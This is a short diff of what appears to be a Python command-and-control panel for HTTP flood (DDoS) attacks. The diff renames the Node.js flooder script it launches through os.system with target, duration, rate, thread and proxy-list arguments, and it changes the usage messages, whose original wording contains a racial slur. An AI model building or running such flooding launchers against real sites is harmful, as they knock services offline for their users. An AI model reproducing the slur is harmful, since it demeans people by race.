@@ -652,10 +652,10 @@ def main():
                 rate = cnc.split()[3]
                 threads = cnc.split()[4]
                 proxy = cnc.split()[5]
-                os.system(f'node HTTP-NIGGA.js {target} {time} {rate} {threads} {proxy}')
+                os.system(f'node 404.js {target} {time} {rate} {threads} {proxy}')
             except IndexError:
-                print('Usage: Nigga <target> <time> <threads> <http.txte> <rps>')
-                print('Example: Nigga https://example.com 60 500 http.txt 500')
+                print('Usage: 404 <target> <time> <threads> <http.txte> <rps>')
+                print('Example: 404 https://example.com 60 500 http.txt 500')
 
         
 
